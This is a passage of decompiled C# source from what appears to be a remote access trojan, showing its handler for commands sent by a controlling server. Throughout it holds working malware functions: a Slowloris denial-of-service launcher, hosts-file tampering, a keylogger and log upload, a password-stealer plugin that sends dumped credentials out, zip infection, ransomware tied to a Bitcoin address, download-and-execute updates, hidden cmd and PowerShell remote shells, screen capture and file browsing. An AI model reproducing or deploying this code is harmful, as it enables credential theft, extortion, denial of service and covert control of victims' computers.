				Slowloris.StartSlowloris(DEB(ref array[1]), 1000, 10000, "JE7&I&e56436CZRNPHM16IGZ5jZ4WG3057e^H1%RTIBC^Y#TMG0$ACZ881ZI^j6V2J4U%5J4&^^3j5E1#WS55IZPJR8#N#7J#7Re7eAWR&$GT4!0#$H^4T7I7He&Wrj$7^5eJEX7E5j$TK@8@Ee1M7UL$4WQMeW6ZTMMIOjeN63&251#rj3GS2T^3@3YGr$J4P22jNW7EXE0V#326J&XXDr#jKTJL#EI10ZX866MW4#@8PjTj&JU#Jj!T&65r61W1G$HIHPJMe7M3^&JG&WG4HR#EZ&&W$NRYUG3T!5IULKe");
				TCP c33 = C;
				string[] array2 = new string[7];
				string[] array21 = array2;
				string text2 = "MSG";
				array21[0] = ENB(ref text2);
				array2[1] = Y;
				array2[2] = "Slowloris Attack Started";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c33.Send(string.Concat(array2));
				break;
			}
			case "stopSlowloris":
			{
				Slowloris.StopSlowloris();
				TCP c43 = C;
				string[] array2 = new string[7];
				string[] array26 = array2;
				string text2 = "MSG";
				array26[0] = ENB(ref text2);
				array2[1] = Y;
				array2[2] = "Slowloris Attack Stoped";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c43.Send(string.Concat(array2));
				break;
			}
			case "OpenPage":
			{
				Process.Start(DEB(ref array[1]));
				TCP c44 = C;
				string[] array2 = new string[7];
				string[] array28 = array2;
				string text2 = "MSG";
				array28[0] = ENB(ref text2);
				array2[1] = Y;
				array2[2] = "Page Has Been Opend";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c44.Send(string.Concat(array2));
				break;
			}
			case "BlocKPage":
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "\r\n127.0.0.1  " + DEB(ref array[1]), true);
					TCP c31 = C;
					string[] array2 = new string[7];
					string[] array19 = array2;
					string text2 = "MSG";
					array19[0] = ENB(ref text2);
					array2[1] = Y;
					array2[2] = "Page Has Been Blocked";
					array2[3] = Y;
					array2[4] = "Succ";
					array2[5] = Y;
					array2[6] = "decode";
					c31.Send(string.Concat(array2));
					break;
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					TCP c32 = C;
					string[] array2 = new string[7];
					string[] array20 = array2;
					string text2 = "MSG";
					array20[0] = ENB(ref text2);
					array2[1] = Y;
					array2[2] = "Page Has not Been Blocked - Access Denied";
					array2[3] = Y;
					array2[4] = "Fail";
					array2[5] = Y;
					array2[6] = "decode";
					c32.Send(string.Concat(array2));
					ProjectData.ClearProjectError();
					break;
				}
			case "Logoff":
			{
				TCP c72 = C;
				string[] array2 = new string[7];
				string[] array67 = array2;
				string text2 = "MSG";
				array67[0] = ENB(ref text2);
				array2[1] = Y;
				array2[2] = "Clinet Loged Off";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c72.Send(string.Concat(array2));
				Interaction.Shell("shutdown -l -t 00", (AppWinStyle)0, false, -1);
				break;
			}
			case "Restart":
			{
				TCP c73 = C;
				string[] array2 = new string[7];
				string[] array68 = array2;
				string text2 = "MSG";
				array68[0] = ENB(ref text2);
				array2[1] = Y;
				array2[2] = "Clinet Device Restarted";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c73.Send(string.Concat(array2));
				Interaction.Shell("shutdown -r -t 00", (AppWinStyle)0, false, -1);
				break;
			}
			case "Shutdown":
			{
				TCP c30 = C;
				string[] array2 = new string[7];
				string[] array18 = array2;
				string text2 = "MSG";
				array18[0] = ENB(ref text2);
				array2[1] = Y;
				array2[2] = "Clinet Device has been shutdown";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c30.Send(string.Concat(array2));
				Interaction.Shell("shutdown -s -t 00", (AppWinStyle)0, false, -1);
				break;
			}
			case "openkl":
			{
				TCP c70 = C;
				string[] array2 = new string[7];
				string[] array66 = array2;
				string text2 = "MSG";
				array66[0] = ENB(ref text2);
				array2[1] = Y;
				array2[2] = "Keylogger Opend";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c70.Send(string.Concat(array2));
				TCP c71 = C;
				text2 = "openkl";
				c71.Send(ENB(ref text2));
				break;
			}
			case "Getloges":
				try
				{
					TCP c48 = C;
					string text10 = "loges";
					string text14 = ENB(ref text10);
					string y = Y;
					string text2 = File.ReadAllText(kl.LogsPath);
					c48.Send(text14 + y + ENB(ref text2));
					break;
				}
				catch (Exception projectError17)
				{
					ProjectData.SetProjectError(projectError17);
					ProjectData.ClearProjectError();
					break;
				}
			case "getpass":
				try
				{
					Assembly assembly3 = Assembly.Load(Convert.FromBase64String(array[1]));
					string text10 = "UGFzc3dvcmRQbHVnaW4uU3RlZWxQYXNzd29yZA==";
					object objectValue3 = RuntimeHelpers.GetObjectValue(assembly3.CreateInstance(DEB(ref text10)));
					TCP c67 = C;
					string[] array2 = new string[5];
					string[] array61 = array2;
					string text3 = "sendpass";
					array61[0] = ENB(ref text3);
					array2[1] = Y;
					string[] array62 = array2;
					object obj3 = objectValue3;
					string text2 = Conversions.ToString(NewLateBinding.LateGet(obj3, (Type)null, "Dump", new object[0], (string[])null, (Type[])null, (bool[])null));
					string text21 = ENB(ref text2);
					NewLateBinding.LateSetComplex(obj3, (Type)null, "Dump", new object[1] { text2 }, (string[])null, (Type[])null, true, false);
					array62[2] = text21;
					array2[3] = Y;
					string[] array63 = array2;
					text10 = Name + "_" + HWD();
					array63[4] = ENB(ref text10);
					c67.Send(string.Concat(array2));
					File.Delete(Interaction.Environ("Temp") + "\\WebPass.exe");
					File.Delete(Interaction.Environ("Temp") + "\\ProdKey.exe");
					File.Delete(Interaction.Environ("Temp") + "\\filezilla.txt");
					TCP c68 = C;
					array2 = new string[7];
					string[] array64 = array2;
					text3 = "MSG";
					array64[0] = ENB(ref text3);
					array2[1] = Y;
					array2[2] = "Password Plugin Has Been Invoked";
					array2[3] = Y;
					array2[4] = "Succ";
					array2[5] = Y;
					array2[6] = "decode";
					c68.Send(string.Concat(array2));
					break;
				}
				catch (Exception projectError20)
				{
					ProjectData.SetProjectError(projectError20);
					TCP c69 = C;
					string[] array2 = new string[7];
					string[] array65 = array2;
					string text3 = "MSG";
					array65[0] = ENB(ref text3);
					array2[1] = Y;
					array2[2] = "Password Plugin Has Faild to invoke";
					array2[3] = Y;
					array2[4] = "Fail";
					array2[5] = Y;
					array2[6] = "decode";
					c69.Send(string.Concat(array2));
					ProjectData.ClearProjectError();
					break;
				}
			case "runzip":
			{
				string[] array2;
				string text3;
				if (Operators.CompareString(HardInstall, "True", false) == 0)
				{
					try
					{
						Assembly assembly = Assembly.Load(Convert.FromBase64String(array[1]));
						text3 = "WmlwSW5mZWN0b3JQbHVnaW4uTWFpbkF0dGFjaw==";
						object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(DEB(ref text3)));
						NewLateBinding.LateCall(objectValue, (Type)null, "RunInfection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						TCP c53 = C;
						array2 = new string[7];
						string[] array36 = array2;
						text3 = "MSG";
						array36[0] = ENB(ref text3);
						array2[1] = Y;
						array2[2] = "Zip Infection Plugin Has Been Invoked";
						array2[3] = Y;
						array2[4] = "Succ";
						array2[5] = Y;
						array2[6] = "decode";
						c53.Send(string.Concat(array2));
						break;
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5);
						Exception ex6 = ex5;
						TCP c54 = C;
						array2 = new string[6];
						string[] array37 = array2;
						string text10 = "MSG";
						array37[0] = ENB(ref text10);
						string[] array38 = array2;
						text3 = ex6.Message;
						array38[1] = ENB(ref text3);
						array2[2] = Y;
						array2[3] = "Fail";
						array2[4] = Y;
						array2[5] = "base";
						c54.Send(string.Concat(array2));
						ProjectData.ClearProjectError();
						break;
					}
				}
				TCP c55 = C;
				array2 = new string[7];
				string[] array39 = array2;
				text3 = "MSG";
				array39[0] = ENB(ref text3);
				array2[1] = Y;
				array2[2] = "this function require hard install";
				array2[3] = Y;
				array2[4] = "Fail";
				array2[5] = Y;
				array2[6] = "decode";
				c55.Send(string.Concat(array2));
				break;
			}
			case "opencustom":
			{
				TCP c52 = C;
				string text3 = "opencustom";
				c52.Send(ENB(ref text3));
				break;
			}
			case "custom":
			{
				Assembly assembly2 = Assembly.Load(Convert.FromBase64String(array[1]));
				object objectValue2 = RuntimeHelpers.GetObjectValue(assembly2.CreateInstance(array[2] + "." + array[3]));
				string[] array2;
				string text3;
				if (Operators.CompareString(array[4], "True", false) == 0)
				{
					if (Operators.CompareString(array[5], "png", false) == 0)
					{
						TCP c63 = C;
						array2 = new string[9];
						string[] array48 = array2;
						text3 = "customoutput";
						array48[0] = ENB(ref text3);
						array2[1] = Y;
						string[] array49 = array2;
						Encoding aSCII = Encoding.ASCII;
						object[] array50 = new object[1];
						object[] array51 = array50;
						object obj3 = objectValue2;
						array51[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj3, (Type)null, "BlackPlugin", new object[0], (string[])null, (Type[])null, (bool[])null));
						object[] array52 = array50;
						object[] array53 = array52;
						bool[] array54 = new bool[1] { true };
						object obj4 = NewLateBinding.LateGet((object)aSCII, (Type)null, "GetBytes", array53, (string[])null, (Type[])null, array54);
						if (array54[0])
						{
							NewLateBinding.LateSetComplex(obj3, (Type)null, "BlackPlugin", new object[1] { RuntimeHelpers.GetObjectValue(array52[0]) }, (string[])null, (Type[])null, true, false);
						}
						array49[2] = Convert.ToBase64String((byte[])obj4);
						array2[3] = Y;
						array2[4] = Name;
						array2[5] = "_";
						array2[6] = HWD();
						array2[7] = Y;
						array2[8] = array[6];
						c63.Send(string.Concat(array2));
					}
					else if (Operators.CompareString(array[5], "exe", false) == 0)
					{
						TCP c64 = C;
						array2 = new string[9];
						string[] array55 = array2;
						text3 = "customoutput";
						array55[0] = ENB(ref text3);
						array2[1] = Y;
						string[] array56 = array2;
						Encoding aSCII2 = Encoding.ASCII;
						object[] array9 = new object[1];
						object[] array57 = array9;
						object obj3 = objectValue2;
						array57[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj3, (Type)null, "BlackPlugin", new object[0], (string[])null, (Type[])null, (bool[])null));
						object[] array52 = array9;
						object[] array58 = array52;
						bool[] array54 = new bool[1] { true };
						object obj5 = NewLateBinding.LateGet((object)aSCII2, (Type)null, "GetBytes", array58, (string[])null, (Type[])null, array54);
						if (array54[0])
						{
							NewLateBinding.LateSetComplex(obj3, (Type)null, "BlackPlugin", new object[1] { RuntimeHelpers.GetObjectValue(array52[0]) }, (string[])null, (Type[])null, true, false);
						}
						array56[2] = Convert.ToBase64String((byte[])obj5);
						array2[3] = Y;
						array2[4] = Name;
						array2[5] = "_";
						array2[6] = HWD();
						array2[7] = Y;
						array2[8] = array[6];
						c64.Send(string.Concat(array2));
					}
					else if (Operators.CompareString(array[5], "txt", false) == 0)
					{
						TCP c65 = C;
						object[] array9 = new object[1];
						object[] array59 = array9;
						text3 = "customoutput";
						array59[0] = Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(ENB(ref text3) + Y), NewLateBinding.LateGet(objectValue2, (Type)null, "BlackPlugin", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)Y), (object)Name), (object)"_"), (object)HWD()), (object)Y), (object)array[6]);
						NewLateBinding.LateCall((object)c65, (Type)null, "Send", array9, (string[])null, (Type[])null, (bool[])null, true);
					}
				}
				else
				{
					NewLateBinding.LateCall(objectValue2, (Type)null, "BlackPlugin", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
				TCP c66 = C;
				array2 = new string[7];
				string[] array60 = array2;
				text3 = "MSG";
				array60[0] = ENB(ref text3);
				array2[1] = Y;
				array2[2] = "Custom Plugin Has Been Invoked";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c66.Send(string.Concat(array2));
				break;
			}
			case "execscrip":
			{
				File.WriteAllText(Path.GetTempPath() + "\\" + exen.Split(new char[1] { '.' })[0] + "." + DEB(ref array[2]), DEB(ref array[1]));
				Process.Start(Path.GetTempPath() + "\\" + exen.Split(new char[1] { '.' })[0] + "." + DEB(ref array[2]));
				TCP c62 = C;
				string[] array2 = new string[7];
				string[] array47 = array2;
				string text3 = "MSG";
				array47[0] = ENB(ref text3);
				array2[1] = Y;
				array2[2] = "Script Has Been Executed";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c62.Send(string.Concat(array2));
				break;
			}
			case "transfer":
			{
				TCP c61 = C;
				string[] array2 = new string[7];
				string[] array46 = array2;
				string text3 = "MSG";
				array46[0] = ENB(ref text3);
				array2[1] = Y;
				array2[2] = "Client Has Been Transferd";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c61.Send(string.Concat(array2));
				Transfer(Status: true, DEB(ref array[1]), Conversions.ToInteger(DEB(ref array[2])), array[3], DEB(ref array[4]));
				Watcher.StopWatcher(DeleteWatcher: true);
				ED();
				pr(0);
				Application.Restart();
				ProjectData.EndApp();
				break;
			}
			case "startransom":
			{
				RansomWare ransomWare = new RansomWare();
				ransomWare.startAction();
				BitcoinAddress = DEB(ref array[1]);
				TCP c59 = C;
				string[] array2 = new string[5];
				string[] array43 = array2;
				string text10 = "sendransompassword";
				array43[0] = ENB(ref text10);
				array2[1] = Y;
				array2[2] = ENB(ref ransompassword);
				array2[3] = Y;
				string[] array44 = array2;
				string text3 = Name + "_" + HWD();
				array44[4] = ENB(ref text3);
				c59.Send(string.Concat(array2));
				TCP c60 = C;
				array2 = new string[7];
				string[] array45 = array2;
				text3 = "MSG";
				array45[0] = ENB(ref text3);
				array2[1] = Y;
				array2[2] = "Client Files Has Been Encrypted";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c60.Send(string.Concat(array2));
				break;
			}
			case "stopransom":
			{
				File.WriteAllText(userDir + "\\" + userName + "\\Desktop\\DecryptKey.txt", DEB(ref array[1]));
				File.WriteAllBytes(userDir + "\\" + userName + "\\Desktop\\Decryptor.exe", Convert.FromBase64String(array[2]));
				Process.Start(userDir + "\\" + userName + "\\Desktop\\Decryptor.exe");
				TCP c58 = C;
				string[] array2 = new string[7];
				string[] array42 = array2;
				string text3 = "MSG";
				array42[0] = ENB(ref text3);
				array2[1] = Y;
				array2[2] = "Ransomware Decryptor Has Been Dropped";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c58.Send(string.Concat(array2));
				break;
			}
			case "elevate":
				RestartElevated();
				break;
			case "Update":
			{
				TCP c57 = C;
				string[] array2 = new string[7];
				string[] array41 = array2;
				string text3 = "MSG";
				array41[0] = ENB(ref text3);
				array2[1] = Y;
				array2[2] = "Client Has Been Updated";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c57.Send(string.Concat(array2));
				Watcher.StopWatcher(DeleteWatcher: true);
				File.WriteAllBytes(Path.GetTempPath() + DEB(ref array[1]), Convert.FromBase64String(array[2]));
				Thread.Sleep(1000);
				Process.Start(Path.GetTempPath() + DEB(ref array[1]));
				ProjectData.EndApp();
				break;
			}
			case "pr":
			{
				string text3 = "pr";
				string text20 = ENB(ref text3);
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					try
					{
						string[] array2 = new string[11]
						{
							text20,
							Y,
							process.ProcessName,
							"||",
							Conversions.ToString(process.Id),
							"||",
							process.MainModule!.FileName,
							"||",
							null,
							null,
							null
						};
						string[] array35 = array2;
						text3 = process.MainModule!.FileVersionInfo.FileDescription;
						array35[8] = ENB(ref text3);
						array2[9] = "||";
						array2[10] = Conversions.ToString(process.MainModule!.ModuleMemorySize);
						text20 = string.Concat(array2);
					}
					catch (Exception projectError19)
					{
						ProjectData.SetProjectError(projectError19);
						text20 = text20 + Y + process.ProcessName + "||" + Conversions.ToString(process.Id) + "||-||-||-";
						ProjectData.ClearProjectError();
					}
				}
				C.Send(text20);
				break;
			}
			case "sr":
			{
				string text3 = "sr";
				string text19 = ENB(ref text3);
				ServiceController[] services = ServiceController.GetServices();
				foreach (ServiceController val4 in services)
				{
					text19 = text19 + Y + val4.get_ServiceName() + "||" + val4.get_DisplayName() + "||" + ((Enum)val4.get_ServiceType()).ToString() + "||" + ((Enum)val4.get_Status()).ToString();
				}
				C.Send(text19);
				break;
			}
			case "sm":
				try
				{
					RegistryKey currentUser = Registry.CurrentUser;
					RegistryKey registryKey2 = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					string text3 = "smu";
					string text17 = ENB(ref text3);
					string[] valueNames2 = registryKey2.GetValueNames();
					foreach (string text18 in valueNames2)
					{
						text17 = text17 + Y + text18 + "/||\\" + Conversions.ToString(registryKey2.GetValue(text18));
					}
					C.Send(text17);
					break;
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					TCP c50 = C;
					string[] array2 = new string[7];
					string[] array32 = array2;
					string text10 = "MSG";
					array32[0] = ENB(ref text10);
					array2[1] = Y;
					string[] array33 = array2;
					string text3 = ex4.Message;
					array33[2] = ENB(ref text3);
					array2[3] = Y;
					array2[4] = "Fail";
					array2[5] = Y;
					array2[6] = "base";
					c50.Send(string.Concat(array2));
					ProjectData.ClearProjectError();
					break;
				}
			case "sml":
				try
				{
					RegistryKey localMachine = Registry.LocalMachine;
					RegistryKey registryKey = localMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					string text3 = "sml";
					string text15 = ENB(ref text3);
					string[] valueNames = registryKey.GetValueNames();
					foreach (string text16 in valueNames)
					{
						text15 = text15 + Y + text16 + "/||\\" + Conversions.ToString(registryKey.GetValue(text16));
					}
					C.Send(text15);
					break;
				}
				catch (Exception projectError18)
				{
					ProjectData.SetProjectError(projectError18);
					TCP c49 = C;
					string[] array2 = new string[7];
					string[] array31 = array2;
					string text3 = "MSG";
					array31[0] = ENB(ref text3);
					array2[1] = Y;
					array2[2] = "Client is not Admin.";
					array2[3] = Y;
					array2[4] = "Fail";
					array2[5] = Y;
					array2[6] = "decode";
					c49.Send(string.Concat(array2));
					ProjectData.ClearProjectError();
					break;
				}
			case "del":
				Exta.DStartup(array[1]);
				break;
			case "Control":
				Controller(array[1], DEB(ref array[2]));
				break;
			case "rss":
			{
				try
				{
					NewLateBinding.LateCall(Pro, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
				catch (Exception projectError16)
				{
					ProjectData.SetProjectError(projectError16);
					ProjectData.ClearProjectError();
				}
				Pro = new Process();
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardOutput", new object[1] { true }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardInput", new object[1] { true }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardError", new object[1] { true }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "FileName", new object[1] { "cmd.exe" }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardError", new object[1] { true }, (string[])null, (Type[])null, false, true);
				((Process)Pro).OutputDataReceived += RS;
				((Process)Pro).ErrorDataReceived += RS;
				((Process)Pro).Exited += delegate
				{
					A.ex();
				};
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "UseShellExecute", new object[1] { false }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateNoWindow", new object[1] { true }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "WindowStyle", new object[1] { ProcessWindowStyle.Hidden }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSet(Pro, (Type)null, "EnableRaisingEvents", new object[1] { true }, (string[])null, (Type[])null);
				TCP c47 = C;
				string text3 = "rss";
				c47.Send(ENB(ref text3));
				NewLateBinding.LateCall(Pro, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(Pro, (Type)null, "BeginErrorReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(Pro, (Type)null, "BeginOutputReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			}
			case "pss":
			{
				try
				{
					NewLateBinding.LateCall(Pro1, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
				catch (Exception projectError15)
				{
					ProjectData.SetProjectError(projectError15);
					ProjectData.ClearProjectError();
				}
				Pro1 = new Process();
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardOutput", new object[1] { true }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardInput", new object[1] { true }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardError", new object[1] { true }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "FileName", new object[1] { "powershell.exe" }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardError", new object[1] { true }, (string[])null, (Type[])null, false, true);
				((Process)Pro1).OutputDataReceived += PRS;
				((Process)Pro1).ErrorDataReceived += PRS;
				((Process)Pro1).Exited += delegate
				{
					pex();
				};
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "UseShellExecute", new object[1] { false }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateNoWindow", new object[1] { true }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "WindowStyle", new object[1] { ProcessWindowStyle.Hidden }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSet(Pro1, (Type)null, "EnableRaisingEvents", new object[1] { true }, (string[])null, (Type[])null);
				TCP c45 = C;
				string text3 = "pss";
				c45.Send(ENB(ref text3));
				NewLateBinding.LateCall(Pro1, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(Pro1, (Type)null, "BeginErrorReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(Pro1, (Type)null, "BeginOutputReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			}
			case "rs":
			{
				object obj2 = NewLateBinding.LateGet(Pro, (Type)null, "StandardInput", new object[0], (string[])null, (Type[])null, (bool[])null);
				object[] array9 = new object[1];
				object[] array29 = array9;
				string text3 = array[1];
				array29[0] = DEB(ref text3);
				NewLateBinding.LateCall(obj2, (Type)null, "WriteLine", array9, (string[])null, (Type[])null, (bool[])null, true);
				break;
			}
			case "rsc":
				try
				{
					NewLateBinding.LateCall(Pro, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
				catch (Exception projectError14)
				{
					ProjectData.SetProjectError(projectError14);
					ProjectData.ClearProjectError();
				}
				Pro = null;
				break;
			case "prs":
			{
				object obj = NewLateBinding.LateGet(Pro1, (Type)null, "StandardInput", new object[0], (string[])null, (Type[])null, (bool[])null);
				object[] array9 = new object[1];
				object[] array27 = array9;
				string text3 = array[1];
				array27[0] = DEB(ref text3);
				NewLateBinding.LateCall(obj, (Type)null, "WriteLine", array9, (string[])null, (Type[])null, (bool[])null, true);
				break;
			}
			case "prsc":
				try
				{
					NewLateBinding.LateCall(Pro1, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
				catch (Exception projectError13)
				{
					ProjectData.SetProjectError(projectError13);
					ProjectData.ClearProjectError();
				}
				Pro1 = null;
				break;
			case "!":
			{
				CRDP.Clear();
				Size size2 = Screen.get_PrimaryScreen().get_Bounds().Size;
				TCP c42 = C;
				string[] array2 = new string[5];
				string[] array25 = array2;
				string text3 = "!";
				array25[0] = ENB(ref text3);
				array2[1] = Y;
				array2[2] = Conversions.ToString(size2.Width);
				array2[3] = Y;
				array2[4] = Conversions.ToString(size2.Height);
				c42.Send(string.Concat(array2));
				break;
			}
			case "!!":
			{
				CRDP.Clear();
				Size size = Screen.get_PrimaryScreen().get_Bounds().Size;
				TCP c41 = C;
				string[] array2 = new string[5];
				string[] array24 = array2;
				string text3 = "!!";
				array24[0] = ENB(ref text3);
				array2[1] = Y;
				array2[2] = Conversions.ToString(size.Width);
				array2[3] = Y;
				array2[4] = Conversions.ToString(size.Height);
				c41.Send(string.Concat(array2));
				break;
			}
			case "@":
			{
				int q2 = Conversions.ToInteger(array[1]);
				int co2 = Conversions.ToInteger(array[2]);
				int qu2 = Conversions.ToInteger(array[3]);
				byte[] array23 = CRDP.Cap(q2, co2, qu2);
				MemoryStream memoryStream2 = new MemoryStream();
				string text3 = "@";
				string text13 = ENB(ref text3) + Y;
				memoryStream2.Write(SB(text13), 0, text13.Length);
				memoryStream2.Write(array23, 0, array23.Length);
				C.Send(memoryStream2.ToArray());
				memoryStream2.Dispose();
				break;
			}
			case "@@":
			{
				int q = Conversions.ToInteger(array[1]);
				int co = Conversions.ToInteger(array[2]);
				int qu = Conversions.ToInteger(array[3]);
				byte[] array22 = CRDP.Cap(q, co, qu);
				MemoryStream memoryStream = new MemoryStream();
				string text3 = "@@";
				string text12 = ENB(ref text3) + Y;
				memoryStream.Write(SB(text12), 0, text12.Length);
				memoryStream.Write(array22, 0, array22.Length);
				C.Send(memoryStream.ToArray());
				memoryStream.Dispose();
				break;
			}
			case "#":
			{
				Point position = new Point(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
				Cursor.set_Position(position);
				mouse_event(Conversions.ToInteger(array[3]), 0, 0, 0, 1);
				break;
			}
			case "$":
			{
				Point position = new Point(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
				Cursor.set_Position(position);
				break;
			}
			case "kill":
				try
				{
					int num = array.Length - 1;
					int num2 = 1;
					while (true)
					{
						int num3 = num2;
						int num4 = num;
						if (num3 <= num4)
						{
							Process.GetProcessById(Conversions.ToInteger(array[1])).Kill();
							num2++;
							continue;
						}
						break;
					}
					break;
				}
				catch (Exception projectError12)
				{
					ProjectData.SetProjectError(projectError12);
					ProjectData.ClearProjectError();
					break;
				}
			case "openscript":
			{
				TCP c40 = C;
				string text3 = "openscript";
				c40.Send(ENB(ref text3));
				break;
			}
			case "opentransfer":
			{
				TCP c39 = C;
				string text3 = "opentransfer";
				c39.Send(ENB(ref text3));
				break;
			}
			case "|||":
			{
				TCP c38 = C;
				string text3 = "|||";
				c38.Send(ENB(ref text3));
				break;
			}
			case "viewimage":
				try
				{
					TCP c37 = C;
					string text3 = "viewimage";
					c37.Send(ENB(ref text3) + Y + Convert.ToBase64String(File.ReadAllBytes(DEB(ref array[1]))));
					break;
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					ProjectData.ClearProjectError();
					break;
				}
			case "GetDrives":
				try
				{
					TCP c36 = C;
					string text3 = "FileManager";
					c36.Send(ENB(ref text3) + Y + getDrives());
					break;
				}
				catch (Exception projectError10)
				{
					ProjectData.SetProjectError(projectError10);
					ProjectData.ClearProjectError();
					break;
				}
			case "FileManager":
				try
				{
					TCP c34 = C;
					string text3 = "FileManager";
					c34.Send(ENB(ref text3) + Y + getFolders(DEB(ref array[1]) + "\\") + getFiles(DEB(ref array[1])));
					break;
				}
				catch (Exception projectError9)
				{
					ProjectData.SetProjectError(projectError9);
					TCP c35 = C;
					string text3 = "FileManager";
